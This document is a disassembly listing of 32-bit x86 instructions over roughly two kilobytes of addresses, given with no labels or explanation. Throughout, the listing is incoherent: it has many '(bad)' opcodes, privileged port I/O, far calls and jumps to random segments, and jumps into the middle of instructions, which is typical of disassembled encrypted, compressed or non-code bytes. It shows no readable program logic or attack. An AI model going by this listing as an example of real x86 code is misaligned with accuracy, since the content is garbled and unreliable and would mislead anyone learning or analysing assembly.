  40a3dd:	pop    esi
  40a3de:	pop    edx
  40a3df:	and    bl,BYTE PTR [ebx]
  40a3e1:	neg    BYTE PTR [ecx-0x69ac704b]
  40a3e7:	mov    bh,0xe8
  40a3e9:	xor    al,0x80
  40a3eb:	lock xor ch,BYTE PTR [esi+0x256aa431]
  40a3f2:	mov    fs:0x4a5c7b2,eax
  40a3f8:	jb     0x40a477
  40a3fa:	jle    0x40a473
  40a3fc:	cwde   
  40a3fd:	jmp    0x2648157
  40a402:	jl     0x40a3d7
  40a404:	dec    esp
  40a405:	ficomp WORD PTR [edx-0x2883c43f]
  40a40b:	in     al,dx
  40a40c:	mov    dl,0xbc
  40a40e:	or     BYTE PTR [eax+edi*4-0x4],dh
  40a412:	push   edi
  40a413:	int3   
  40a414:	scas   al,BYTE PTR es:[edi]
  40a415:	sti    
  40a416:	adc    esi,0xffffff86
  40a419:	or     ebp,DWORD PTR [eax]
  40a41b:	imul   esi,edi,0xbcba16ac
  40a421:	(bad)  
  40a422:	popf   
  40a423:	test   dl,cl
  40a425:	out    0x92,al
  40a427:	shl    BYTE PTR [edx-0x78],0xba
  40a42b:	dec    ebx
  40a42c:	mov    ds:0xfd11f00b,eax
  40a431:	shl    BYTE PTR [edx+0x0],cl
  40a434:	xchg   edi,eax
  40a435:	jg     0x40a3d2
  40a437:	jl     0x40a485
  40a439:	test   DWORD PTR [edx+0x6f],0x9772ce9d
  40a440:	mov    cl,0x70
  40a442:	add    al,0xa7
  40a444:	cmc    
  40a445:	adc    dl,BYTE PTR [ecx+eiz*1-0x6f08dc33]
  40a44c:	mov    dl,0x17
  40a44e:	and    al,0xfd
  40a450:	(bad)  
  40a451:	lock loopne 0x40a40b
  40a454:	push   cs
  40a455:	or     edi,DWORD PTR [ecx+0x3c2e2752]
  40a45b:	push   ds
  40a45c:	sbb    al,0x3b
  40a45e:	call   0xebc8:0x655f8417
  40a465:	add    BYTE PTR [edi+0x6ad7c1b8],dh
  40a46b:	out    0x99,al
  40a46d:	xchg   ebx,eax
  40a46e:	mov    ebp,0x68e388d0
  40a473:	dec    esi
  40a474:	mov    dl,0x62
  40a476:	sbb    eax,0x8cab5c2b
  40a47b:	sbb    dh,BYTE PTR [edi-0x2c586d17]
  40a481:	mov    cl,BYTE PTR [edi+0x40]
  40a484:	js     0x40a4b8
  40a486:	mov    DWORD PTR [esi-0x4e],ecx
  40a489:	adc    eax,0x5b4298e3
  40a48e:	xchg   esp,eax
  40a48f:	cs mov edi,0xf39fd008
  40a495:	in     eax,0xb3
  40a497:	cmp    DWORD PTR [edi],eax
  40a499:	int3   
  40a49a:	push   cs
  40a49b:	xchg   ecx,edi
  40a49d:	inc    esp
  40a49e:	lea    esi,[eax]
  40a4a0:	push   esp
  40a4a1:	sti    
  40a4a2:	cwde   
  40a4a3:	mov    dh,0x68
  40a4a5:	std    
  40a4a6:	add    BYTE PTR [eax+0xd],bl
  40a4a9:	imul   edi,eax,0xffffffeb
  40a4ac:	retf   0x470b
  40a4af:	mov    cl,0x39
  40a4b1:	fsubr  st,st(0)
  40a4b3:	add    eax,0x4959f3a
  40a4b8:	xchg   DWORD PTR [edi-0x15],ebp
  40a4bb:	daa    
  40a4bc:	fisub  WORD PTR [esi-0x7a]
  40a4bf:	mov    BYTE PTR [esi],dl
  40a4c1:	or     edi,DWORD PTR [eax+0x95822df]
  40a4c7:	outs   dx,DWORD PTR ds:[esi]
  40a4c8:	icebp  
  40a4c9:	retf   
  40a4ca:	call   0x2907:0x4898e51
  40a4d1:	fisubr DWORD PTR ds:0xae431a0
  40a4d7:	add    eax,0xbf9ab0a6
  40a4dc:	xchg   eax,ebx
  40a4de:	jae    0x40a498
  40a4e0:	mov    dl,0x86
  40a4e2:	mov    esp,0xaac4e6d9
  40a4e7:	dec    esp
  40a4e8:	inc    ecx
  40a4e9:	or     edx,edx
  40a4eb:	cmp    al,0x40
  40a4ed:	cwde   
  40a4ee:	(bad)  
  40a4ef:	cmp    bh,BYTE PTR [esi+0x24]
  40a4f2:	popf   
  40a4f3:	stos   BYTE PTR es:[edi],al
  40a4f4:	fmul   QWORD PTR [ecx]
  40a4f6:	inc    ecx
  40a4f7:	mov    edx,0x84e17a42
  40a4fc:	dec    ebp
  40a4fd:	or     edi,ecx
  40a4ff:	stc    
  40a500:	ja     0x40a539
  40a502:	pop    ss
  40a503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a504:	out    dx,al
  40a505:	aam    0x2a
  40a507:	adc    eax,0xde5dd6b2
  40a50c:	push   0xa5a101db
  40a511:	or     BYTE PTR [eax+0x54fc3522],dh
  40a517:	loope  0x40a55a
  40a519:	test   BYTE PTR [edx],cl
  40a51b:	adc    edx,DWORD PTR [ecx+ebx*8-0x40f5953f]
  40a522:	call   0x1c71:0x24bdf53
  40a529:	pop    es
  40a52a:	je     0x40a504
  40a52c:	mov    esp,0xe05ddccf
  40a531:	imul   edx,DWORD PTR [edi],0xffffffd9
  40a534:	push   cs
  40a535:	cmp    al,0x5a
  40a537:	mov    al,ds:0x38d42da4
  40a53c:	cmp    al,BYTE PTR [ebp-0x26]
  40a53f:	lahf   
  40a540:	in     al,0x65
  40a542:	iret   
  40a543:	cdq    
  40a544:	(bad)  
  40a545:	sar    DWORD PTR [esi-0x65e6014f],cl
  40a54b:	sub    DWORD PTR [edx+0xf7aa542],ebx
  40a551:	or     eax,DWORD PTR [ebx]
  40a553:	dec    eax
  40a554:	ret    0x1e2c
  40a557:	push   es
  40a558:	jno    0x40a4f0
  40a55a:	fwait
  40a55b:	xchg   ebp,eax
  40a55c:	jmp    0x40a4df
  40a55e:	fwait
  40a55f:	sub    DWORD PTR [edi+0x1d],eax
  40a562:	pop    edx
  40a563:	jmp    0x6dd1:0x1cc60a1a
  40a56a:	call   0x340c73d2
  40a56f:	inc    esi
  40a570:	mov    dl,0xbe
  40a572:	ja     0x40a593
  40a574:	and    BYTE PTR [esi+0x36cb73f5],dl
  40a57a:	out    dx,eax
  40a57b:	sti    
  40a57c:	mov    ch,0x4c
  40a57e:	dec    edx
  40a57f:	cmc    
  40a580:	outs   dx,DWORD PTR ds:[esi]
  40a581:	lds    ebx,FWORD PTR [edx-0x44de94f]
  40a587:	sub    DWORD PTR [edx+0x73f43a92],esi
  40a58d:	mov    cl,0xec
  40a58f:	sub    eax,0x72770b77
  40a594:	xchg   DWORD PTR [edx],ecx
  40a596:	xor    al,0x22
  40a598:	div    BYTE PTR [ebx-0x3c4d821e]
  40a59e:	(bad)  
  40a59f:	jno    0x40a55c
  40a5a1:	push   ecx
  40a5a2:	cmp    bl,BYTE PTR [ecx+0x756e0a3b]
  40a5a8:	jnp    0x40a577
  40a5aa:	push   eax
  40a5ab:	or     ebx,DWORD PTR [edx-0x693e0185]
  40a5b1:	lahf   
  40a5b2:	sbb    al,BYTE PTR [ecx+0x25d34b2]
  40a5b8:	ins    DWORD PTR es:[edi],dx
  40a5b9:	retf   
  40a5ba:	leave  
  40a5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5bc:	fmul   DWORD PTR [eax+0x562cdf5f]
  40a5c2:	dec    ebx
  40a5c3:	or     al,0xb2
  40a5c5:	stc    
  40a5c6:	imul   edi,ecx,0xdecfab89
  40a5cc:	cs jbe 0x40a5db
  40a5cf:	aaa    
  40a5d0:	push   0x3c12a95b
  40a5d5:	or     ecx,DWORD PTR [edi+0x742a2fc2]
  40a5db:	shl    dh,1
  40a5dd:	mov    fs,WORD PTR [esi-0x37740be2]
  40a5e3:	inc    ebx
  40a5e4:	clc    
  40a5e5:	add    al,0xd8
  40a5e7:	cli    
  40a5e8:	pop    ebx
  40a5e9:	or     ecx,DWORD PTR [eax+0x24]
  40a5ec:	in     eax,0xd4
  40a5ee:	aad    0x42
  40a5f0:	rcl    cl,cl
  40a5f2:	call   0x7abe:0x3ea1955e
  40a5f9:	push   ebx
  40a5fa:	les    esp,FWORD PTR [edi+0x4685c4c6]
  40a600:	ss adc eax,0x30b6a15d
  40a606:	inc    esi
  40a607:	test   eax,0x105ddd24
  40a60c:	mov    WORD PTR [edi+0x7e],cs
  40a60f:	out    dx,eax
  40a610:	jb     0x40a5de
  40a612:	pusha  
  40a613:	retf   0xbcb
  40a616:	fst    DWORD PTR [esi]
  40a618:	ins    BYTE PTR es:[edi],dx
  40a619:	rcr    dh,1
  40a61b:	xor    ch,BYTE PTR es:[edx]
  40a61e:	sub    dl,BYTE PTR [ebp+0x5ab6abb2]
  40a624:	cmc    
  40a625:	icebp  
  40a626:	sub    BYTE PTR [eax-0x5877624d],al
  40a62c:	push   esp
  40a62d:	scas   al,BYTE PTR es:[edi]
  40a62e:	pop    ss
  40a62f:	inc    esi
  40a630:	shl    BYTE PTR [ecx],1
  40a632:	call   0x9636:0xd78b155c
  40a639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a63a:	dec    ebp
  40a63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a63c:	iret   
  40a63d:	ss pop ecx
  40a63f:	ret    
  40a640:	lods   eax,DWORD PTR ds:[esi]
  40a641:	push   es
  40a642:	and    al,0x91
  40a644:	mov    esi,ebp
  40a646:	cmp    al,0xba
  40a648:	cli    
  40a649:	inc    edi
  40a64a:	popf   
  40a64b:	mov    eax,ds:0xff9ad275
  40a650:	push   0xc9a79d84
  40a655:	aas    
  40a656:	dec    esi
  40a657:	clc    
  40a658:	add    eax,0xb23c08e1
  40a65d:	pop    edx
  40a65e:	xchg   edi,eax
  40a65f:	in     eax,0x8d
  40a661:	fucomp st(2)
  40a664:	mov    cl,0xb
  40a666:	jmp    0x40a6d1
  40a668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a669:	ss fwait
  40a66b:	jo     0x40a647
  40a66d:	dec    edx
  40a66e:	xchg   ebx,eax
  40a66f:	bound  ebp,QWORD PTR [esp+eax*4-0x5a]
  40a673:	daa    
  40a674:	outs   dx,BYTE PTR ds:[esi]
  40a675:	enter  0x35df,0x49
  40a679:	or     ecx,DWORD PTR [ebx]
  40a67b:	(bad)  
  40a67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a67d:	leave  
  40a67e:	cmp    DWORD PTR [ebx+eax*4],ebp
  40a681:	push   0xffffff9b
  40a683:	inc    ebp
  40a684:	xchg   BYTE PTR [ecx-0x1c0da763],ah
  40a68a:	pop    esi
  40a68b:	or     BYTE PTR [ebp+0x1c],bh
  40a68e:	cwde   
  40a68f:	jnp    0x40a684
  40a691:	or     dl,BYTE PTR [edi+0x14]
  40a694:	pop    ss
  40a695:	and    DWORD PTR [eax],esi
  40a697:	push   0x97583662
  40a69c:	mov    ebp,0x112bb978
  40a6a1:	jbe    0x40a67d
  40a6a3:	jae    0x40a642
  40a6a5:	mov    esp,0xb09e17b
  40a6aa:	and    eax,0x205d742e
  40a6af:	sbb    edi,DWORD PTR [eax]
  40a6b1:	cmc    
  40a6b2:	call   0xe9ea:0x304710b7
  40a6b9:	outs   dx,DWORD PTR ds:[esi]
  40a6ba:	mov    al,ds:0xd5028ca7
  40a6bf:	(bad)  
  40a6c0:	out    dx,al
  40a6c1:	and    eax,0xffffffe6
  40a6c4:	mov    cl,0x1b
  40a6c6:	inc    esi
  40a6c7:	dec    ecx
  40a6c8:	mov    ah,0x65
  40a6ca:	enter  0xb232,0xf9
  40a6ce:	adc    al,0xae
  40a6d0:	xchg   edx,eax
  40a6d1:	lock xchg esi,eax
  40a6d3:	mov    al,ds:0xcba26d50
  40a6d8:	sub    BYTE PTR [ebx-0x6749fc3c],ch
  40a6de:	call   0x3f9e:0xbc6a0f0e
  40a6e5:	cmp    eax,0xbf4dd89
  40a6ea:	into   
  40a6eb:	cmc    
  40a6ec:	and    eax,0x936b7584
  40a6f1:	fcomp  DWORD PTR [edx-0x72596afc]
  40a6f7:	adc    eax,0x9e54021d
  40a6fc:	fcomp  DWORD PTR [edx-0x66]
  40a6ff:	jo     0x40a6f5
  40a701:	or     al,0x90
  40a703:	jmp    0x40a74d
  40a705:	mov    al,0x99
  40a707:	retf   
  40a708:	adc    BYTE PTR [ebp-0x34b89495],bh
  40a70e:	pop    ecx
  40a70f:	ficom  DWORD PTR [ecx]
  40a711:	or     ebx,DWORD PTR [ebx-0x68877818]
  40a717:	jmp    0xc2db676f
  40a71c:	mov    edi,?
  40a71e:	rcr    BYTE PTR gs:[edx+0x65a78df5],1
  40a725:	inc    ecx
  40a726:	cmp    BYTE PTR [ebp+0x66625ed1],dl
  40a72c:	mov    ebp,0x777d8a62
  40a731:	gs popa 
  40a733:	pop    es
  40a734:	fucom  st(0)
  40a736:	in     eax,0xc5
  40a738:	dec    DWORD PTR [ebx]
  40a73a:	pushf  
  40a73b:	jae    0x40a768
  40a73d:	mov    bh,0xde
  40a73f:	sar    BYTE PTR [edx-0x39],0x9b
  40a743:	ret    
  40a744:	in     al,0x6a
  40a746:	sbb    ch,bh
  40a748:	jg     0x40a717
  40a74a:	push   esi
  40a74b:	lods   al,BYTE PTR ds:[esi]
  40a74c:	sbb    BYTE PTR [ebx],cl
  40a74e:	inc    eax
  40a74f:	out    dx,al
  40a750:	or     edx,edi
  40a752:	sbb    ah,0x44
  40a755:	les    edx,FWORD PTR [esp+edi*4+0x7d58588]
  40a75c:	push   0xffffff9d
  40a75e:	jmp    0xf433:0x1e388c2e
  40a765:	pop    ss
  40a766:	adc    ebx,DWORD PTR [edi-0x72]
  40a769:	retf   
  40a76a:	pop    ecx
  40a76b:	iret   
  40a76c:	scas   al,BYTE PTR es:[edi]
  40a76d:	mov    ah,0x24
  40a76f:	gs mov dl,0xb1
  40a772:	or     DWORD PTR [eax+esi*8+0x4ca7e78d],ecx
  40a779:	add    ch,BYTE PTR [ebx+0x14]
  40a77c:	in     al,0xb0
  40a77e:	fwait
  40a77f:	je     0x40a733
  40a781:	out    0x9f,al
  40a783:	and    dh,BYTE PTR [esp+ebp*2+0xa151dcb]
  40a78a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a78b:	bound  ebp,QWORD PTR [ebp-0x6e]
  40a78e:	lock test al,0x6a
  40a791:	ret    
  40a792:	and    eax,0x247cb2c7
  40a797:	cmp    DWORD PTR [ebx-0x7177110a],eax
  40a79d:	fwait
  40a79e:	imul   ebp,ebx,0x9d9ab9e8
  40a7a4:	sbb    eax,0x211f08ef
  40a7a9:	js     0x40a745
  40a7ab:	ins    DWORD PTR es:[edi],dx
  40a7ac:	out    0x8d,eax
  40a7ae:	es dec ecx
  40a7b0:	fisttp DWORD PTR [esi-0x54575805]
  40a7b6:	pop    es
  40a7b7:	mov    al,ds:0x922c9b81
  40a7bc:	mov    dl,0x4f
  40a7be:	cmp    eax,0xa0e6fbca
  40a7c3:	pop    esp
  40a7c4:	jl     0x40a7ce
  40a7c6:	push   eax
  40a7c7:	fwait
  40a7c8:	adc    eax,esp
  40a7ca:	jno    0x40a785
  40a7cc:	add    ah,BYTE PTR [ebx+0x32ad3c93]
  40a7d2:	out    0xa5,eax
  40a7d4:	xchg   edi,eax
  40a7d5:	pop    ebp
  40a7d6:	dec    edi
  40a7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7d8:	std    
  40a7d9:	add    ah,0xc4
  40a7dc:	xor    ch,BYTE PTR [edi-0x16]
  40a7df:	push   ebx
  40a7e0:	mov    bh,BYTE PTR [edx]
  40a7e2:	mov    bh,0x27
  40a7e4:	dec    esp
  40a7e5:	jno    0x40a864
  40a7e7:	loopne 0x40a7b7
  40a7e9:	aas    
  40a7ea:	icebp  
  40a7eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ec:	pushf  
  40a7ed:	jmp    0x68b33dce
  40a7f2:	sub    dh,BYTE PTR [eax+0x4a]
  40a7f5:	adc    dl,ch
  40a7f7:	(bad)  
  40a7f8:	mov    dl,0x37
  40a7fa:	add    al,dl
  40a7fc:	cmp    bl,BYTE PTR [eax+0xb7f1107]
  40a802:	jge    0x40a866
  40a804:	in     al,0xb9
  40a806:	cmp    eax,0x9d666a0f
  40a80b:	adc    BYTE PTR [ebp+0x6292cedf],ch
  40a811:	mov    bh,0x2
  40a813:	call   0xc759:0x6acc0bbe
  40a81a:	inc    esi
  40a81b:	fstp   DWORD PTR [esi+0x63eb9aab]
  40a821:	shr    BYTE PTR [eax+eiz*2],0x9c
  40a825:	pop    ecx
  40a826:	aam    0x30
  40a828:	dec    edx
  40a829:	mov    al,ds:0xb1b92c6
  40a82e:	dec    ebp
  40a82f:	add    al,0x46
  40a831:	mov    edi,edi
  40a833:	and    BYTE PTR [esp+eax*1],dh
  40a836:	inc    edx
  40a837:	jecxz  0x40a827
  40a839:	out    0xfa,eax
  40a83b:	int3   
  40a83c:	sub    eax,DWORD PTR [ebp+0x43b237b7]
  40a842:	repz (bad) 
  40a845:	add    al,0x75
  40a847:	add    BYTE PTR [edx],al
  40a849:	or     esi,DWORD PTR [ebx-0x35eeba51]
  40a84f:	repnz push esp
  40a851:	mov    al,ss:0x3a0b034e
  40a857:	mov    ds:0xe1c03d16,al
  40a85c:	inc    esp
  40a85d:	or     edx,DWORD PTR [eax+0x7167928a]
  40a863:	inc    ebx
  40a864:	cmp    bh,BYTE PTR [ecx-0x66]
  40a867:	mov    ds:0x1ab9cda9,eax
  40a86c:	std    
  40a86d:	repnz repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a870:	retf   0x2aa2
  40a873:	sub    DWORD PTR [ebp-0x4d084f77],0xffffffeb
  40a87a:	cs push ax
  40a87d:	dec    ebx
  40a87e:	ins    BYTE PTR es:[edi],dx
  40a87f:	out    dx,al
  40a880:	jo     0x40a88d
  40a882:	jne    0x40a89f
  40a884:	(bad)  
  40a885:	and    DWORD PTR [edi-0x5],0xec942edd
  40a88c:	xchg   edx,eax
  40a88d:	cdq    
  40a88e:	ret    
  40a88f:	cdq    
  40a890:	cmp    BYTE PTR [esi+ebp*8+0x36],cl
  40a894:	mov    bl,0x68
  40a896:	or     bh,BYTE PTR [ebp-0x3f156e16]
  40a89c:	jno    0x40a8a9
  40a89e:	pop    ebx
  40a89f:	add    edx,DWORD PTR ds:0xb8e3ce2a
  40a8a5:	cmp    ebx,DWORD PTR [edx-0x52e825a1]
  40a8ab:	push   cs
  40a8ac:	mov    al,0xe2
  40a8ae:	push   0x34b17ba6
  40a8b3:	sub    DWORD PTR [ebx-0x53],0xc1a557ea
  40a8ba:	call   0xe238:0x237a1b2
  40a8c1:	addr16 cwde 
  40a8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8c4:	lock add DWORD PTR [esi-0x7d],edx
  40a8c8:	mov    esp,0xb2a66491
  40a8cd:	iret   
  40a8ce:	in     al,0x31
  40a8d0:	jp     0x40a8bf
  40a8d2:	jg     0x40a865
  40a8d4:	xor    al,0xb
  40a8d6:	mov    bl,0xcf
  40a8d8:	cld    
  40a8d9:	xchg   esi,eax
  40a8da:	dec    esi
  40a8db:	jecxz  0x40a959
  40a8dd:	adc    ebp,esp
  40a8df:	mov    al,0xb2
  40a8e1:	aaa    
  40a8e2:	shr    BYTE PTR [ebx],1
  40a8e4:	aas    
  40a8e5:	cmp    edi,ebx
  40a8e7:	dec    esp
  40a8e8:	pop    ebx
  40a8e9:	or     esi,DWORD PTR [edi+0x1f5d0a89]
  40a8ef:	pop    es
  40a8f0:	(bad)  
  40a8f2:	out    0x59,eax
  40a8f4:	mov    cl,0x12
  40a8f6:	cmp    DWORD PTR [esi-0x1d],0x354f7d9e
  40a8fd:	cmp    ch,bl
  40a8ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a900:	xchg   ebp,eax
  40a901:	mov    eax,0x51f61358
  40a906:	in     eax,0xfc
  40a908:	mov    fs,edx
  40a90a:	and    BYTE PTR [ebx-0x38],dl
  40a90d:	push   ss
  40a90e:	call   0x71:0xabb6e19d
  40a915:	push   esp
  40a916:	mov    esp,0xff7cb7a7
  40a91b:	jp     0x40a912
  40a91d:	dec    ebp
  40a91e:	hlt    
  40a91f:	adc    esi,DWORD PTR [edx-0x5309f039]
  40a925:	fwait
  40a926:	pop    es
  40a927:	add    dh,BYTE PTR [ecx]
  40a929:	or     esi,DWORD PTR [edi-0x606a9b90]
  40a92f:	sbb    BYTE PTR [edx-0x2f186590],bl
  40a935:	cwde   
  40a936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a937:	fs pushf 
  40a939:	xchg   edi,eax
  40a93a:	mov    cl,0xa7
  40a93c:	clc    
  40a93d:	inc    ebp
  40a93e:	call   0xf2c8d22f
  40a943:	loope  0x40a8fc
  40a945:	cs push ebp
  40a947:	mov    ebp,0xa65ac2eb
  40a94c:	retf   
  40a94d:	es (bad) 
  40a94f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a950:	rsm    
  40a952:	outs   dx,DWORD PTR ds:[esi]
  40a953:	nop
  40a954:	inc    eax
  40a955:	lds    eax,FWORD PTR [edi-0x65fedd1f]
  40a95b:	int    0xfe
  40a95d:	imul   eax,DWORD PTR [esi-0x4c],0xa23825f8
  40a964:	sub    BYTE PTR [edi],bl
  40a966:	or     BYTE PTR [ebx+ebx*1+0x8],0x19
  40a96b:	aas    
  40a96c:	xchg   DWORD PTR [esi+0x4353674a],ebp
  40a972:	xchg   ebp,eax
  40a973:	xchg   ecx,eax
  40a974:	leave  
  40a975:	sub    esi,DWORD PTR [ebx+edx*1]
  40a978:	add    DWORD PTR [ebx],ecx
  40a97a:	mov    bl,0xac
  40a97c:	cmp    bl,dl
  40a97e:	loopne 0x40a90d
  40a980:	out    0x8,eax
  40a982:	sub    al,BYTE PTR [eax-0x25]
  40a985:	and    eax,0xea62ba0d
  40a98a:	(bad)  
  40a98b:	int3   
  40a98c:	dec    esp
  40a98d:	adc    DWORD PTR [esi+0x68],edi
  40a990:	ret    0xeb1f
  40a993:	pop    edx
  40a994:	mov    dl,0x90
  40a996:	adc    BYTE PTR [ebx-0x56],dl
  40a999:	mov    esi,0xba562c7
  40a99e:	mov    cl,0x0
  40a9a0:	and    dl,bh
  40a9a2:	push   eax
  40a9a3:	(bad)  [edi-0x6d]
  40a9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9a7:	xor    DWORD PTR [ecx],ebx
  40a9a9:	push   ebx
  40a9aa:	mov    bh,0xa7
  40a9ac:	sbb    al,0x87
  40a9ae:	or     ebx,edi
  40a9b0:	push   0xb1ece2d6
  40a9b5:	mov    ebx,0x97b22d85
  40a9ba:	fs (bad) 
  40a9bc:	repz xor ah,BYTE PTR [ebp+0x13]
  40a9c0:	aaa    
  40a9c1:	push   ss
  40a9c2:	adc    eax,0xa2cb2566
  40a9c7:	sbb    eax,0xb99be541
  40a9cc:	mov    ebx,0xd59c0467
  40a9d1:	mov    eax,DWORD PTR [ecx+esi*1]
  40a9d4:	sub    esp,ebx
  40a9d6:	dec    edi
  40a9d7:	fmul   DWORD PTR [ebx]
  40a9d9:	pop    ss
  40a9da:	jno    0x40a9cb
  40a9dc:	mov    esi,0x9a77c15
  40a9e1:	mov    ecx,esp
  40a9e3:	retf   
  40a9e4:	stos   BYTE PTR es:[edi],al
  40a9e5:	cs cdq 
  40a9e7:	test   BYTE PTR [ebx],bl
  40a9e9:	data16 mov al,0x2a
  40a9ec:	jno    0x40a999
  40a9ee:	jbe    0x40a979
  40a9f0:	lea    ecx,[ebx]
  40a9f2:	add    al,0xb0
  40a9f4:	pusha  
  40a9f5:	lock jne 0x40aa2b
  40a9f8:	mov    ebx,0xbc69e858
  40a9fd:	test   BYTE PTR [eax+ebp*8],0x4
  40aa01:	imul   esi,edi,0xffffffd7
  40aa04:	inc    eax
  40aa05:	push   es
  40aa06:	ret    
  40aa07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa08:	pop    DWORD PTR [ebp+0x3b71ed69]
  40aa0e:	jge    0x40aa3c
  40aa10:	mov    ebp,0xcf300846
  40aa15:	and    BYTE PTR gs:[edi+0x77d3a1cc],ah
  40aa1c:	sub    eax,0x4b515174
  40aa21:	or     edi,DWORD PTR [edx+0x35bb4814]
  40aa27:	rcr    edi,cl
  40aa29:	je     0x40a9c5
  40aa2b:	mov    cl,0x18
  40aa2d:	cld    
  40aa2e:	pop    ecx
  40aa2f:	xchg   ebx,eax
  40aa30:	ret    
  40aa31:	mov    esp,0x27ce0da8
  40aa37:	inc    esp
  40aa38:	push   edx
  40aa39:	mov    bh,0x58
  40aa3b:	push   cs
  40aa3c:	jl     0x40aa52
  40aa3e:	mov    ah,0xe0
  40aa40:	jns    0x40aa08
  40aa42:	call   0xf968:0xf31586ac
  40aa49:	icebp  
  40aa4a:	xchg   ebp,eax
  40aa4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa4c:	sbb    eax,0x474e3d36
  40aa51:	out    dx,eax
  40aa52:	inc    ecx
  40aa53:	lock enter 0x951e,0xee
  40aa58:	or     DWORD PTR [ebx+0x54],0xffffffe7
  40aa5c:	popa   
  40aa5d:	pop    ebp
  40aa5e:	mov    ebp,0xc00b16af
  40aa63:	rol    BYTE PTR [ebx-0x32],0x78
  40aa67:	inc    eax
  40aa68:	(bad)  
  40aa6a:	cdq    
  40aa6b:	push   edi
  40aa6c:	ss test eax,0xdb930ffc
  40aa72:	jmp    0x266f04a2
  40aa77:	imul   BYTE PTR [esi+ebx*8-0x67]
  40aa7b:	sub    al,0x73
  40aa7d:	out    0x74,eax
  40aa7f:	pop    ss
  40aa80:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40aa82:	call   0xa8d35b40
  40aa87:	in     al,0x47
  40aa89:	inc    edi
  40aa8a:	imul   ebp,DWORD PTR [ecx+0xa],0x12
  40aa8e:	push   es
  40aa8f:	push   ds
  40aa90:	mov    dl,0xaf
  40aa92:	xchg   esi,eax
  40aa93:	lock loope 0x40aaaa
  40aa96:	pop    ebp
  40aa97:	adc    al,0x1f
  40aa99:	or     ebx,DWORD PTR [edx-0x22]
  40aa9c:	mov    bh,0x38
  40aa9e:	jmp    0xbf12eda9
  40aaa3:	add    BYTE PTR [ebp*4-0x626a5a66],al
  40aaaa:	clc    
  40aaab:	test   eax,0x5dbd9bb6
  40aab0:	xor    eax,0x929b630b
  40aab5:	xor    dh,dh
  40aab7:	xchg   ebp,eax
  40aab8:	daa    
  40aab9:	(bad)  
  40aabb:	xchg   edi,eax
  40aabc:	cld    
  40aabd:	adc    DWORD PTR [edi+0x62],edx
  40aac0:	dec    ebp
  40aac1:	or     ebp,DWORD PTR [ebx-0x4b]
  40aac4:	sub    ebx,ebp
  40aac6:	ja     0x40ab1a
  40aac8:	jmp    0x40aa81
  40aaca:	call   0x82d1:0x8515b8ba
  40aad1:	push   edi
  40aad2:	cli    
  40aad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aad4:	fs popa 
  40aad6:	aam    0x21
  40aad8:	call   0x2f00:0xb5484183
  40aadf:	outs   dx,BYTE PTR ds:[esi]
  40aae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aae1:	push   ebx
  40aae2:	jmp    0x75a7:0xf3d823e1
  40aae9:	jmp    0x40aae5
  40aaeb:	push   0xffffffbf
  40aaed:	sbb    cl,BYTE PTR [edx]
  40aaef:	stc    
  40aaf0:	retf   
  40aaf1:	ret    
  40aaf2:	call   0x6231:0x46871bed
  40aaf9:	(bad)  
  40aafa:	xchg   ebp,eax
  40aafb:	test   eax,0x98b7d9b9
  40ab00:	shl    BYTE PTR [ecx],cl
  40ab02:	and    bl,BYTE PTR [edx-0x60]
  40ab05:	outs   dx,DWORD PTR ds:[esi]
  40ab06:	fwait
  40ab07:	or     DWORD PTR [ebx+0x68ed4a],0xffffff9a
  40ab0e:	jb     0x40ab3b
  40ab10:	test   al,0xe9
  40ab12:	ins    BYTE PTR es:[edi],dx
  40ab13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab14:	out    dx,al
  40ab15:	rol    bh,1
  40ab17:	mov    al,0x3d
  40ab19:	dec    ebx
  40ab1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab1b:	nop
  40ab1c:	mov    dl,0x7c
  40ab1e:	int    0xbc
  40ab20:	push   eax
  40ab21:	sahf   
  40ab22:	jp     0x40aaba
  40ab24:	into   
  40ab25:	or     edx,ebp
  40ab27:	popa   
  40ab28:	sub    al,0xce
  40ab2a:	adc    edx,DWORD PTR [eax]
  40ab2c:	ds jno 0x40aac9
  40ab2f:	jl     0x40ab65
  40ab31:	call   0xa766:0x1aa51f4f
  40ab38:	aam    0xa1
  40ab3a:	cwde   
  40ab3b:	scas   al,BYTE PTR es:[edi]
  40ab3c:	jno    0x40ab3d
  40ab3e:	jbe    0x40aba8
  40ab40:	out    dx,al
  40ab41:	jne    0x40abba
  40ab43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab44:	xor    ebp,DWORD PTR [eax+edi*1+0x46143920]
  40ab4b:	(bad)  
  40ab4c:	out    dx,al
  40ab4d:	or     eax,DWORD PTR [esi-0x2fafb2ba]
  40ab53:	adc    eax,0x899a3305
  40ab58:	inc    esi
  40ab59:	sub    edx,ebp
  40ab5b:	cmp    edi,DWORD PTR [edx-0x67]
  40ab5e:	inc    esp
  40ab5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab60:	popf   
  40ab61:	mov    ebx,0xd2218c66
  40ab66:	adc    DWORD PTR [ebx+0x676cecb9],0xffffff8d
  40ab6d:	or     BYTE PTR [ebp-0x3c],cl
